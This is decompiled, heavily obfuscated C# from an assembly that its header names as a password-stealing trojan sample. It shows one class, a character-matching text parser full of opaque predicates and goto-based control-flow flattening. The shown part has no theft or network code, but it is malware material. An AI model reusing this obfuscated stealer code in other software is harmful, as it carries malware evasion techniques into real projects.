// Decompiled with JetBrains decompiler
// Type: wG.SV
// Assembly: Type, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 716CE3A9-BAD1-470D-912F-B421D403F66E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-ee62dc596e4b4fe76f8e015ac250d696a483f656ebb02d02815520b3fd560e30.exe

using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace wG
{
  public class SV : wN
  {
    protected string Mkc;
    private uF xkn;
    private static SV ybD;

    public SV()
    {
      SV.ybR();
      // ISSUE: explicit constructor call
      this.\u002Ector("");
    }

    public SV(string _param1)
    {
      XTG.fvQjdC();
      // ISSUE: explicit constructor call
      base.\u002Ector((TextWriter) null);
      this.hTM(_param1);
    }

    public SV(string _param1, TextWriter _param2)
    {
      XTG.fvQjdC();
      // ISSUE: explicit constructor call
      base.\u002Ector(_param2);
      this.hTM(_param1);
      this.SGl = new wN.CGv(((wN) this).OGQ);
    }

    public override string R1K(C9 _param1)
    {
      string str1 = base.R1K(_param1);
      if (_param1.PGA == -100)
        goto label_7;
label_6:
      return str1;
label_7:
      string str2 = _param1.q1T(this.Mkc);
      if (str2.Length >= 32)
      {
        str1 = (string) SV.Dbe((object) str1, (object) " <", (object) str2.Substring(0, 29), (object) "...>");
      }
      else
      {
        int num1 = 1;
        if (!SV.kbt())
          goto label_4;
label_1:
        while (true)
        {
          switch (num1)
          {
            case 1:
              str1 = str1 + " <" + str2 + ">";
              num1 = SV.cb7() == null ? 0 : 0;
              continue;
            default:
              goto label_5;
          }
        }
label_4:
        int num2;
        num1 = num2;
        goto label_1;
      }
label_5:
      goto label_6;
    }

    public void xT0(string _param1, TextWriter _param2)
    {
      this.KGI(_param2);
      this.hTM(_param1);
    }

    public void hTM(string _param1)
    {
      if (_param1 == null)
        _param1 = "";
      this.Mkc = _param1;
      int num1 = 0;
      if (!SV.kbt())
        goto label_4;
label_1:
      switch (num1)
      {
        default:
          this.SG0 = _param1.Length;
          this.tGM = 0;
          this.xkn.bGB = new SortedList<int, int>();
          this.xkn.bGB[0] = 1;
          return;
      }
label_4:
      int num2;
      num1 = num2;
      goto label_1;
    }

    public string sTo() => this.Mkc;

    public bool kT6(wN.CGS _param1, out string _param2)
    {
      int tGm = this.tGM;
      bool flag = _param1();
      int num = 0;
      if (!SV.kbt())
        goto label_3;
label_1:
      switch (num)
      {
        case 1:
          _param2 = "";
          return false;
        default:
          if (flag)
          {
            _param2 = (string) SV.XbF((object) this.Mkc, tGm, this.tGM - tGm);
            return true;
          }
          goto case 1;
      }
label_3:
      num = 0;
      goto label_1;
    }

    public bool hTl(wN.CGS _param1, out ej _param2)
    {
      _param2.bGa = this.tGM;
      bool flag = _param1();
      _param2.tGd = this.tGM;
      return flag;
    }

    public bool sTt(wN.CGS _param1, out int _param2)
    {
      _param2 = 0;
      string s;
      if (!this.kT6(_param1, out s))
      {
        int num1 = 1;
        if (!SV.kbt())
          goto label_4;
label_1:
        switch (num1)
        {
          case 1:
            return false;
          default:
            goto label_6;
        }
label_4:
        int num2;
        num1 = num2;
        goto label_1;
      }
label_6:
      return int.TryParse(s, out _param2);
    }

    public bool gT8(wN.CGS _param1, out double _param2)
    {
      int num = 1;
      while (true)
      {
        switch (num)
        {
          case 1:
            _param2 = 0.0;
            num = !SV.kbt() ? 0 : 0;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_2;
        }
      }
label_2:
      string s;
      bool flag = this.kT6(_param1, out s) && double.TryParse(s, out _param2);
label_3:
      return flag;
    }

    private void CTz(string _param1, string _param2)
    {
      int num1;
      int num2;
      this.xkn.gz(this.Mkc, this.tGM, out num1, out num2);
      SV.pbh((object) this.fG6, (object) "<{0},{1}>{2}:{3}", (object) new object[4]
      {
        (object) num1,
        (object) num2,
        (object) _param1,
        (object) _param2
      });
      this.fG6.Flush();
    }

    public virtual bool T1D(string _param1)
    {
      this.CTz("FATAL", _param1);
      throw new jf();
    }

    public bool rkB(string _param1)
    {
      this.CTz("WARNING", _param1);
      return true;
    }

    public bool fkG(SV.zGb _param1)
    {
      switch (1)
      {
        case 1:
          if (this.tGM >= this.SG0 || !_param1.VNG(this.Mkc[this.tGM]))
            return true;
          goto default;
        default:
          ++this.tGM;
          goto case 1;
      }
    }

    public bool NkT(SV.zGb _param1)
    {
      int num1 = 2;
label_1:
      int num2 = num1;
      int tGm;
      while (true)
      {
        switch (num2)
        {
          case 2:
            tGm = this.tGM;
            num2 = !SV.kbt() ? 1 : 1;
            continue;
          default:
            if (this.tGM < this.SG0 && _param1.VNG(this.Mkc[this.tGM]))
            {
              ++this.tGM;
              if (SV.kbt())
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else
              goto label_4;
        }
      }
label_4:
      return this.tGM > tGm;
    }

    public bool ckk(char _param1)
    {
      bool flag;
      if (this.tGM < this.SG0 && (int) this.Mkc[this.tGM] == (int) _param1)
      {
        ++this.tGM;
        flag = true;
      }
      else
        goto label_4;
label_3:
      return flag;
label_4:
      flag = false;
      int num1 = 0;
      if (SV.cb7() != null)
        goto label_5;
label_1:
      switch (num1)
      {
        default:
          goto label_3;
      }
label_5:
      int num2;
      num1 = num2;
      goto label_1;
    }

    public bool jka(char _param1, char _param2)
    {
      bool flag1 = this.tGM + 1 < this.SG0 && (int) this.Mkc[this.tGM] == (int) _param1 && (int) this.Mkc[this.tGM + 1] == (int) _param2;
      int num1 = 1;
      if (SV.cb7() != null)
        goto label_6;
label_1:
      bool flag2;
      while (true)
      {
        switch (num1)
        {
          case 1:
            if (flag1)
            {
              this.tGM += 2;
              flag2 = true;
              int num2;
              num1 = SV.kbt() ? 0 : num2;
              continue;
            }
            goto label_2;
          default:
            goto label_5;
        }
      }
label_2:
      flag2 = false;
label_5:
      return flag2;
label_6:
      num1 = 1;
      goto label_1;
    }

    public bool ckd(char _param1, char _param2, char _param3)
    {
      int num1 = 1;
label_1:
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            if (this.tGM + 2 < this.SG0)
            {
              if (SV.kbt())
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else
              goto label_13;
          case 2:
            goto label_7;
          default:
            if ((int) this.Mkc[this.tGM] == (int) _param1)
            {
              if (SV.kbt())
              {
                num2 = 2;
                continue;
              }
              goto label_1;
            }
            else
              goto label_13;
        }
      }
label_7:
      int num3;
      if ((int) this.Mkc[this.tGM + 1] == (int) _param2)
      {
        num3 = (int) this.Mkc[this.tGM + 2] == (int) _param3 ? 1 : 0;
        goto label_14;
      }
label_13:
      num3 = 0;
label_14:
      if (num3 == 0)
        return false;
      this.tGM += 3;
      return true;
    }

    public bool ykH(char _param1, char _param2, char _param3, char _param4)
    {
      bool flag;
      if (this.tGM + 3 < this.SG0 && (int) this.Mkc[this.tGM] == (int) _param1 && (int) SV.LbI((object) this.Mkc, this.tGM + 1) == (int) _param2 && (int) this.Mkc[this.tGM + 2] == (int) _param3 && (int) this.Mkc[this.tGM + 3] == (int) _param4)
      {
        int num1 = 0;
        if (SV.cb7() != null)
          goto label_3;
label_1:
        while (true)
        {
          switch (num1)
          {
            case 1:
              goto label_5;
            default:
              this.tGM += 4;
              flag = true;
              int num2;
              num1 = SV.kbt() ? 1 : num2;
              continue;
          }
        }
label_3:
        num1 = 0;
        goto label_1;
      }
      else
        flag = false;
label_5:
      return flag;
    }

    public bool okA(char _param1, char _param2, char _param3, char _param4, char _param5)
    {
      if (this.tGM + 4 >= this.SG0 || (int) this.Mkc[this.tGM] != (int) _param1 || (int) this.Mkc[this.tGM + 1] != (int) _param2)
        goto label_8;
      else
        goto label_4;
label_3:
      return false;
label_4:
      int num1 = 1;
      if (SV.cb7() != null)
        goto label_5;
label_1:
      int num2;
      switch (num1)
      {
        case 1:
          if ((int) this.Mkc[this.tGM + 2] == (int) _param3 && (int) this.Mkc[this.tGM + 3] == (int) _param4)
          {
            num2 = (int) SV.LbI((object) this.Mkc, this.tGM + 4) == (int) _param5 ? 1 : 0;
            goto label_9;
          }
          else
            goto label_8;
        default:
          goto label_3;
      }
label_5:
      num1 = 1;
      goto label_1;
label_8:
      num2 = 0;
label_9:
      if (num2 != 0)
      {
        this.tGM += 5;
        return true;
      }
      goto label_3;
    }

    public bool Gke(
      char _param1,
      char _param2,
      char _param3,
      char _param4,
      char _param5,
      char _param6)
    {
      if (this.tGM + 5 >= this.SG0 || (int) this.Mkc[this.tGM] != (int) _param1 || (int) this.Mkc[this.tGM + 1] != (int) _param2 || (int) this.Mkc[this.tGM + 2] != (int) _param3 || (int) this.Mkc[this.tGM + 3] != (int) _param4 || (int) SV.LbI((object) this.Mkc, this.tGM + 4) != (int) _param5 || (int) this.Mkc[this.tGM + 5] != (int) _param6)
        goto label_5;
      else
        goto label_2;
label_1:
      bool flag;
      int num;
      switch (num)
      {
        case 2:
          flag = true;
          break;
      }
      return flag;
label_2:
      this.tGM += 6;
      num = 2;
      goto label_1;
label_5:
      flag = false;
      num = 1;
      if (SV.cb7() != null)
      {
        num = 1;
        goto label_1;
      }
      else
        goto label_1;
    }

    public bool Pkf(
      char _param1,
      char _param2,
      char _param3,
      char _param4,
      char _param5,
      char _param6,
      char _param7)
    {
      if (this.tGM + 6 >= this.SG0 || (int) this.Mkc[this.tGM] != (int) _param1 || (int) this.Mkc[this.tGM + 1] != (int) _param2)
        goto label_12;
      else
        goto label_5;
label_1:
      int num1;
      int num2 = num1;
label_2:
      while (true)
      {
        switch (num2)
        {
          case 1:
            if ((int) this.Mkc[this.tGM + 2] == (int) _param3 && (int) this.Mkc[this.tGM + 3] == (int) _param4)
            {
              if (SV.kbt())
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else
              goto label_12;
          case 2:
            goto label_4;
          default:
            goto label_8;
        }
      }
label_8:
      int num3;
      if ((int) this.Mkc[this.tGM + 4] == (int) _param5 && (int) this.Mkc[this.tGM + 5] == (int) _param6)
      {
        num3 = (int) this.Mkc[this.tGM + 6] == (int) _param7 ? 1 : 0;
        goto label_13;
      }
      else
        goto label_12;
label_4:
      bool flag;
      return flag;
label_5:
      if (SV.kbt())
      {
        num2 = 1;
        goto label_2;
      }
      else
        goto label_1;
label_12:
      num3 = 0;
label_13:
      if (num3 == 0)
      {
        flag = false;
        num2 = 2;
        goto label_2;
      }
      else
      {
        this.tGM += 7;
        flag = true;
        goto label_4;
      }
    }

    public bool EkF(
      char _param1,
      char _param2,
      char _param3,
      char _param4,
      char _param5,
      char _param6,
      char _param7,
      char _param8)
    {
      if (this.tGM + 7 >= this.SG0 || (int) this.Mkc[this.tGM] != (int) _param1 || (int) this.Mkc[this.tGM + 1] != (int) _param2 || (int) SV.LbI((object) this.Mkc, this.tGM + 2) != (int) _param3 || (int) this.Mkc[this.tGM + 3] != (int) _param4)
        goto label_10;
      else
        goto label_8;
label_5:
      return false;
label_8:
      int num1 = 0;
      if (SV.cb7() != null)
        goto label_9;
label_1:
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_7;
          case 2:
            goto label_5;
          default:
            if ((int) this.Mkc[this.tGM + 4] == (int) _param5)
            {
              num1 = SV.cb7() == null ? 1 : 1;
              continue;
            }
            goto label_10;
        }
      }
label_7:
      int num2;
      if ((int) this.Mkc[this.tGM + 5] == (int) _param6 && (int) this.Mkc[this.tGM + 6] == (int) _param7)
      {
        num2 = (int) this.Mkc[this.tGM + 7] == (int) _param8 ? 1 : 0;
        goto label_11;
      }
      else
        goto label_10;
label_9:
      num1 = 0;
      goto label_1;
label_10:
      num2 = 0;
label_11:
      if (num2 != 0)
      {
        this.tGM += 8;
        return true;
      }
      goto label_5;
    }

    public bool gky(string _param1)
    {
      int length = _param1.Length;
      bool flag1;
      if (this.tGM + length > this.SG0)
        flag1 = false;
      else
        goto label_12;
label_6:
      return flag1;
label_12:
      int index = 0;
      while (true)
      {
        bool flag2 = index < length;
        int num1 = 0;
        if (SV.kbt())
          goto label_2;
label_1:
        int num2;
        num1 = num2;
label_2:
        while (true)
        {
          switch (num1)
          {
            case 1:
              goto label_6;
            case 2:
              goto label_7;
            default:
              if (flag2)
              {
                if ((int) _param1[index] != (int) SV.LbI((object) this.Mkc, this.tGM + index))
                {
                  flag1 = false;
                  if (SV.cb7() == null)
                  {
                    num1 = 1;
                    continue;
                  }
                  goto label_1;
                }
                else
                  goto label_7;
              }
              else
                goto label_4;
          }
        }
label_7:
        ++index;
      }
label_4:
      this.tGM += length;
      flag1 = true;
      goto label_6;
    }

    public bool okm(char _param1)
    {
      if (this.tGM >= this.SG0 || (int) char.ToUpper(this.Mkc[this.tGM]) != (int) _param1)
        goto label_6;
      else
        goto label_3;
label_2:
      bool flag;
      return flag;
label_3:
      int num = 0;
      if (!SV.kbt())
        goto label_4;
label_1:
      while (true)
      {
        switch (num)
        {
          case 1:
            goto label_2;
          default:
            ++this.tGM;
            flag = true;
            num = SV.cb7() == null ? 1 : 0;
            continue;
        }
      }
label_4:
      num = 0;
      goto label_1;
label_6:
      flag = false;
      goto label_2;
    }

    public bool Ukj(char _param1, char _param2)
    {
      bool flag = this.tGM + 1 < this.SG0 && (int) SV.bbA(this.Mkc[this.tGM]) == (int) char.ToUpper(_param1) && (int) char.ToUpper(this.Mkc[this.tGM + 1]) == (int) char.ToUpper(_param2);
      int num1 = 1;
      if (!SV.kbt())
        goto label_6;
label_1:
      while (true)
      {
        switch (num1)
        {
          case 1:
            if (flag)
            {
              this.tGM += 2;
              num1 = SV.cb7() == null ? 0 : 0;
              continue;
            }
            goto label_3;
          default:
            goto label_4;
        }
      }
label_3:
      return false;
label_4:
      return true;
label_6:
      int num2;
      num1 = num2;
      goto label_1;
    }

    public bool Rk9(char _param1, char _param2, char _param3)
    {
      int num1 = 1;
label_1:
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            if (this.tGM + 2 >= this.SG0)
            {
              if (SV.kbt())
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else
              goto label_3;
          case 2:
            goto label_10;
          default:
            goto label_11;
        }
      }
label_3:
      int num3;
      if ((int) char.ToUpper(this.Mkc[this.tGM]) == (int) char.ToUpper(_param1) && (int) char.ToUpper(this.Mkc[this.tGM + 1]) == (int) char.ToUpper(_param2))
      {
        num3 = (int) char.ToUpper(SV.LbI((object) this.Mkc, this.tGM + 2)) == (int) char.ToUpper(_param3) ? 1 : 0;
        goto label_12;
      }
      else
        goto label_11;
label_10:
      bool flag;
      return flag;
label_11:
      num3 = 0;
label_12:
      if (num3 != 0)
      {
        this.tGM += 3;
        flag = true;
        goto label_10;
      }
      else
      {
        flag = false;
        goto label_10;
      }
    }

    public bool HkR(char _param1, char _param2, char _param3, char _param4)
    {
      if (this.tGM + 3 >= this.SG0 || (int) char.ToUpper(SV.LbI((object) this.Mkc, this.tGM)) != (int) char.ToUpper(_param1))
        goto label_9;
      else
        goto label_8;
label_1:
      int num1;
      int num2 = num1;
label_2:
      int num3;
      switch (num2)
      {
        case 1:
          if ((int) char.ToUpper(SV.LbI((object) this.Mkc, this.tGM + 1)) == (int) char.ToUpper(_param2) && (int) char.ToUpper(this.Mkc[this.tGM + 2]) == (int) char.ToUpper(_param3))
          {
            num3 = (int) char.ToUpper(this.Mkc[this.tGM + 3]) == (int) char.ToUpper(_param4) ? 1 : 0;
            goto label_10;
          }
          else
            goto label_9;
      }
label_7:
      bool flag;
      return flag;
label_8:
      if (SV.cb7() == null)
      {
        num2 = 1;
        goto label_2;
      }
      else
        goto label_1;
label_9:
      num3 = 0;
label_10:
      if (num3 == 0)
      {
        flag = false;
        num2 = 0;
        if (SV.cb7() == null)
          goto label_2;
        else
          goto label_1;
      }
      else
      {
        this.tGM += 4;
        flag = true;
        goto label_7;
      }
    }

    public bool Yk4(char _param1, char _param2, char _param3, char _param4, char _param5)
    {
      if (this.tGM + 4 >= this.SG0 || (int) char.ToUpper(this.Mkc[this.tGM]) != (int) char.ToUpper(_param1) || (int) char.ToUpper(this.Mkc[this.tGM + 1]) != (int) char.ToUpper(_param2) || (int) char.ToUpper(this.Mkc[this.tGM + 2]) != (int) SV.bbA(_param3))
        goto label_9;
      else
        goto label_4;
label_1:
      int num1;
      int num2;
      switch (num2)
      {
        case 1:
          if ((int) SV.bbA(this.Mkc[this.tGM + 3]) == (int) SV.bbA(_param4))
          {
            num1 = (int) char.ToUpper(this.Mkc[this.tGM + 4]) == (int) char.ToUpper(_param5) ? 1 : 0;
            goto label_10;
          }
          else
            goto label_9;
        default:
          return true;
      }
label_4:
      num2 = SV.kbt() ? 1 : 1;
      goto label_1;
label_9:
      num1 = 0;
label_10:
      if (num1 == 0)
        return false;
      this.tGM += 5;
      num2 = 0;
      if (!SV.kbt())
      {
        int num3;
        num2 = num3;
        goto label_1;
      }
      else
        goto label_1;
    }

    public bool zk2(
      char _param1,
      char _param2,
      char _param3,
      char _param4,
      char _param5,
      char _param6)
    {
      int num1 = 2;
label_1:
      int num2 = num1;
      bool flag1;
      while (true)
      {
        bool flag2;
        int num3;
        switch (num2)
        {
          case 1:
            num3 = 0;
            break;
          case 2:
            if (this.tGM + 5 < this.SG0)
            {
              if ((int) SV.bbA(this.Mkc[this.tGM]) == (int) char.ToUpper(_param1) && (int) char.ToUpper(SV.LbI((object) this.Mkc, this.tGM + 1)) == (int) char.ToUpper(_param2) && (int) char.ToUpper(this.Mkc[this.tGM + 2]) == (int) char.ToUpper(_param3) && (int) char.ToUpper(this.Mkc[this.tGM + 3]) == (int) char.ToUpper(_param4) && (int) char.ToUpper(this.Mkc[this.tGM + 4]) == (int) char.ToUpper(_param5))
              {
                num3 = (int) char.ToUpper(this.Mkc[this.tGM + 5]) == (int) char.ToUpper(_param6) ? 1 : 0;
                break;
              }
              goto case 1;
            }
            else
            {
              if (SV.cb7() == null)
              {
                num2 = 1;
                continue;
              }
              goto label_1;
            }
          case 3:
            goto label_12;
          default:
            if (flag2)
            {
              this.tGM += 6;
              flag1 = true;
              num2 = 3;
              continue;
            }
            goto label_7;
        }
        flag2 = num3 != 0;
        if (SV.cb7() == null)
          num2 = 0;
        else
          goto label_1;
      }
label_7:
      flag1 = false;
label_12:
      return flag1;
    }

    public bool lkN(
      char _param1,
      char _param2,
      char _param3,
      char _param4,
      char _param5,
      char _param6,
      char _param7)
    {
      if (this.tGM + 6 >= this.SG0 || (int) char.ToUpper(this.Mkc[this.tGM]) != (int) char.ToUpper(_param1))
        goto label_12;
      else
        goto label_3;
label_1:
      int num1;
      int num2 = num1;
label_2:
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_10;
          case 2:
            goto label_6;
          default:
            if ((int) char.ToUpper(this.Mkc[this.tGM + 1]) == (int) char.ToUpper(_param2) && (int) char.ToUpper(SV.LbI((object) this.Mkc, this.tGM + 2)) == (int) char.ToUpper(_param3) && (int) char.ToUpper(this.Mkc[this.tGM + 3]) == (int) char.ToUpper(_param4))
            {
              if (SV.kbt())
              {
                num2 = 2;
                continue;
              }
              goto label_1;
            }
            else
              goto label_12;
        }
      }
label_6:
      int num3;
      if ((int) char.ToUpper(this.Mkc[this.tGM + 4]) == (int) char.ToUpper(_param5) && (int) char.ToUpper(this.Mkc[this.tGM + 5]) == (int) SV.bbA(_param6))
      {
        num3 = (int) char.ToUpper(this.Mkc[this.tGM + 6]) == (int) char.ToUpper(_param7) ? 1 : 0;
        goto label_13;
      }
      else
        goto label_12;
label_10:
      bool flag;
      if (!flag)
        return false;
      this.tGM += 7;
      return true;
label_3:
      if (SV.kbt())
      {
        num2 = 0;
        goto label_2;
      }
      else
        goto label_1;
label_12:
      num3 = 0;
label_13:
      flag = num3 != 0;
      num2 = 1;
      if (SV.kbt())
        goto label_2;
      else
        goto label_1;
    }

    public bool Skg(string _param1)
    {
      int num1 = SV.Pbc((object) _param1);
      bool flag1 = this.tGM + num1 > this.SG0;
      int num2 = 2;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_8;
          case 2:
            if (flag1)
            {
              num2 = SV.kbt() ? 0 : 0;
              continue;
            }
            goto label_10;
          default:
            goto label_7;
        }
      }
label_7:
      bool flag2 = false;
label_8:
      return flag2;
label_10:
      for (int index = 0; index < num1; ++index)
      {
        if ((int) _param1[index] != (int) char.ToUpper(this.Mkc[this.tGM + index]))
        {
          flag2 = false;
          goto label_8;
        }
      }
      this.tGM += num1;
      flag2 = true;
      goto label_8;
    }

    public bool HkV(char _param1, char _param2)
    {
      if (this.tGM >= this.SG0 || (int) this.Mkc[this.tGM] < (int) _param1)
        goto label_8;
      else
        goto label_3;
label_1:
      int num1;
      int num2;
      switch (num2)
      {
        case 1:
          goto label_5;
        default:
          num1 = (int) this.Mkc[this.tGM] <= (int) _param2 ? 1 : 0;
          goto label_9;
      }
label_3:
      num2 = SV.cb7() != null ? 0 : 0;
      goto label_1;
label_5:
      bool flag;
      return flag;
label_8:
      num1 = 0;
label_9:
      if (num1 != 0)
      {
        ++this.tGM;
        flag = true;
        num2 = 1;
        if (SV.cb7() != null)
        {
          int num3;
          num2 = num3;
          goto label_1;
        }
        else
          goto label_1;
      }
      else
      {
        flag = false;
        goto label_5;
      }
    }

    public bool nkx(char _param1, char _param2, char _param3, char _param4)
    {
      if (this.tGM < this.SG0)
        goto label_6;
label_3:
      return false;
label_6:
      char ch = this.Mkc[this.tGM];
      if ((int) ch < (int) _param1)
        goto label_9;
      else
        goto label_7;
label_2:
      goto label_3;
label_7:
      int num1 = 1;
      if (!SV.kbt())
        goto label_8;
label_1:
      while (true)
      {
        switch (num1)
        {
          case 1:
            if ((int) ch > (int) _param2)
            {
              num1 = 2;
              continue;
            }
            goto label_11;
          case 2:
            goto label_9;
          default:
            goto label_2;
        }
      }
label_11:
      int num2 = 1;
      goto label_12;
label_8:
      int num3;
      num1 = num3;
      goto label_1;
label_9:
      num2 = (int) ch < (int) _param3 ? 0 : ((int) ch <= (int) _param4 ? 1 : 0);
label_12:
      if (num2 != 0)
      {
        ++this.tGM;
        return true;
      }
      goto label_2;
    }

    public bool ck7(
      char _param1,
      char _param2,
      char _param3,
      char _param4,
      char _param5,
      char _param6)
    {
      if (this.tGM < this.SG0)
        goto label_8;
label_4:
      bool flag1 = false;
      goto label_10;
label_8:
      char ch = this.Mkc[this.tGM];
      if ((int) ch < (int) _param1 || (int) ch > (int) _param2)
        goto label_5;
      else
        goto label_14;
label_1:
      bool flag2;
      int num1;
      int num2;
      switch (num2)
      {
        case 1:
          num1 = (int) ch <= (int) _param6 ? 1 : 0;
          goto label_15;
        case 2:
          goto label_10;
        case 3:
          if ((int) ch <= (int) _param4)
            goto label_14;
          else
            break;
        default:
          if (flag2)
          {
            ++this.tGM;
            flag1 = true;
            goto label_10;
          }
          else
            goto label_4;
      }
label_2:
      if ((int) ch >= (int) _param5)
      {
        num2 = SV.cb7() == null ? 1 : 1;
        goto label_1;
      }
      else
      {
        num1 = 0;
        goto label_15;
      }
label_5:
      if ((int) ch >= (int) _param3)
      {
        num2 = 3;
        goto label_1;
      }
      else
        goto label_2;
label_14:
      num1 = 1;
label_15:
      flag2 = num1 != 0;
      num2 = 0;
      if (SV.cb7() != null)
      {
        int num3;
        num2 = num3;
        goto label_1;
      }
      else
        goto label_1;
label_10:
      return flag1;
    }

    public bool IkY(
      char _param1,
      char _param2,
      char _param3,
      char _param4,
      char _param5,
      char _param6,
      char _param7,
      char _param8)
    {
      if (this.tGM < this.SG0)
        goto label_13;
      else
        goto label_12;
label_1:
      char ch;
      int num1;
      int num2;
      switch (num2)
      {
        case 1:
          num1 = (int) ch <= (int) _param8 ? 1 : 0;
          goto label_16;
        case 2:
          if ((int) ch <= (int) _param6)
            goto label_15;
          else
            goto label_7;
        case 3:
          break;
        default:
          ++this.tGM;
          return true;
      }
label_6:
      return false;
label_7:
      if ((int) ch >= (int) _param7)
      {
        num2 = !SV.kbt() ? 1 : 1;
        goto label_1;
      }
      else
      {
        num1 = 0;
        goto label_16;
      }
label_12:
      num2 = 3;
      goto label_1;
label_13:
      ch = SV.LbI((object) this.Mkc, this.tGM);
      if (((int) ch < (int) _param1 || (int) ch > (int) _param2) && ((int) ch < (int) _param3 || (int) ch > (int) _param4))
      {
        if ((int) ch >= (int) _param5)
        {
          num2 = 2;
          goto label_1;
        }
        else
          goto label_7;
      }
label_15:
      num1 = 1;
label_16:
      if (num1 != 0)
      {
        num2 = 0;
        if (!SV.kbt())
        {
          num2 = 0;
          goto label_1;
        }
        else
          goto label_1;
      }
      else
        goto label_6;
    }

    public bool okQ(string _param1)
    {
      if (this.tGM >= this.SG0)
        goto label_12;
      else
        goto label_11;
label_5:
      bool flag1;
      return flag1;
label_11:
      char ch = this.Mkc[this.tGM];
      int index = 0;
      while (true)
      {
        bool flag2 = index < _param1.Length - 1;
        int num1 = 3;
        while (true)
        {
          switch (num1)
          {
            case 1:
              flag1 = true;
              num1 = 2;
              continue;
            case 2:
              goto label_5;
            case 3:
              if (!flag2)
              {
                int num2;
                num1 = SV.kbt() ? 0 : num2;
                continue;
              }
              goto label_7;
            default:
              ++this.tGM;
              num1 = !SV.kbt() ? 1 : 1;
              continue;
          }
        }
label_7:
        if ((int) ch >= (int) _param1[index] && (int) ch <= (int) _param1[index + 1])
          index += 2;
        else
          break;
      }
      flag1 = false;
      goto label_5;
label_12:
      flag1 = false;
      goto label_5;
    }

    public bool TkI(string _param1)
    {
      if (this.tGM >= this.SG0)
        return false;
      int num1 = 0;
      if (SV.kbt())
        goto label_2;
label_1:
      int num2;
      num1 = num2;
label_2:
      int index;
      char ch;
      bool flag;
      while (true)
      {
        switch (num1)
        {
          case 1:
            if (index < _param1.Length - 1)
              goto case 3;
            else
              goto label_11;
          case 2:
            if (!flag)
            {
              index += 2;
              if (SV.kbt())
              {
                num1 = 1;
                continue;
              }
              goto label_1;
            }
            else
              goto label_10;
          case 3:
            flag = (int) ch >= (int) _param1[index] && (int) ch <= (int) _param1[index + 1];
            num1 = SV.kbt() ? 2 : 0;
            continue;
          default:
            ch = this.Mkc[this.tGM];
            index = 0;
            goto case 1;
        }
      }
label_10:
      return false;
label_11:
      ++this.tGM;
      return true;
    }

    public bool gk1(char _param1, char _param2)
    {
      bool flag1 = this.tGM < this.SG0 && ((int) this.Mkc[this.tGM] == (int) _param1 || (int) SV.LbI((object) this.Mkc, this.tGM) == (int) _param2);
      int num = 0;
      if (SV.kbt())
        goto label_6;
label_1:
      bool flag2;
      while (true)
      {
        switch (num)
        {
          case 1:
            if (!flag1)
            {
              flag2 = false;
              num = !SV.kbt() ? 0 : 0;
              continue;
            }
            goto label_3;
          default:
            goto label_4;
        }
      }
label_3:
      ++this.tGM;
      flag2 = true;
label_4:
      return flag2;
label_6:
      num = 1;
      goto label_1;
    }

    public bool ykp(char _param1, char _param2, char _param3)
    {
      bool flag;
      if (this.tGM < this.SG0)
      {
        char ch = this.Mkc[this.tGM];
        int num1 = 0;
        if (!SV.kbt())
          goto label_3;
label_1:
        switch (num1)
        {
          case 1:
            goto label_6;
          default:
            if ((int) ch == (int) _param1 || (int) ch == (int) _param2 || (int) ch == (int) _param3)
            {
              ++this.tGM;
              flag = true;
              goto label_6;
            }
            else
              goto label_7;
        }
label_3:
        int num2;
        num1 = num2;
        goto label_1;
      }
      else
        goto label_7;
label_6:
      return flag;
label_7:
      flag = false;
      goto label_6;
    }

    public bool kku(char _param1, char _param2, char _param3, char _param4)
    {
      if (this.tGM >= this.SG0)
        goto label_4;
      else
        goto label_5;
label_2:
      bool flag;
      return flag;
label_4:
      flag = false;
      goto label_2;
label_5:
      int num1 = 0;
      if (SV.cb7() != null)
        goto label_6;
label_1:
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_8;
          case 2:
            goto label_2;
          default:
            char ch = SV.LbI((object) this.Mkc, this.tGM);
            if ((int) ch == (int) _param1 || (int) ch == (int) _param2 || (int) ch == (int) _param3 || (int) ch == (int) _param4)
            {
              int num2;
              num1 = SV.kbt() ? 1 : num2;
              continue;
            }
            goto label_4;
        }
      }
label_8:
      ++this.tGM;
      flag = true;
      goto label_2;
label_6:
      num1 = 0;
      goto label_1;
    }

    public bool KkW(char _param1, char _param2, char _param3, char _param4, char _param5)
    {
      if (this.tGM < this.SG0)
        goto label_3;
label_2:
      bool flag = false;
      goto label_7;
label_3:
      char ch = this.Mkc[this.tGM];
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_7;
          case 2:
            if ((int) ch != (int) _param1 && (int) ch != (int) _param2 && (int) ch != (int) _param3 && (int) ch != (int) _param4)
            {
              int num2;
              num1 = SV.cb7() == null ? 0 : num2;
              continue;
            }
            goto label_9;
          default:
            goto label_6;
        }
      }
label_6:
      int num3 = (int) ch == (int) _param5 ? 1 : 0;
      goto label_10;
label_9:
      num3 = 1;
label_10:
      if (num3 != 0)
      {
        ++this.tGM;
        flag = true;
      }
      else
        goto label_2;
label_7:
      return flag;
    }

    public bool ekK(
      char _param1,
      char _param2,
      char _param3,
      char _param4,
      char _param5,
      char _param6)
    {
      if (this.tGM < this.SG0)
        goto label_6;
label_5:
      return false;
label_6:
      char ch = this.Mkc[this.tGM];
      if ((int) ch == (int) _param1 || (int) ch == (int) _param2 || (int) ch == (int) _param3 || (int) ch == (int) _param4)
        goto label_10;
      else
        goto label_7;
label_1:
      bool flag;
      int num1;
      int num2;
      switch (num2)
      {
        case 1:
          if (flag)
          {
            ++this.tGM;
            return true;
          }
          break;
        case 2:
          if ((int) ch != (int) _param5)
          {
            num1 = (int) ch == (int) _param6 ? 1 : 0;
            goto label_11;
          }
          else
            goto label_10;
      }
      goto label_5;
label_7:
      num2 = 2;
      goto label_1;
label_10:
      num1 = 1;
label_11:
      flag = num1 != 0;
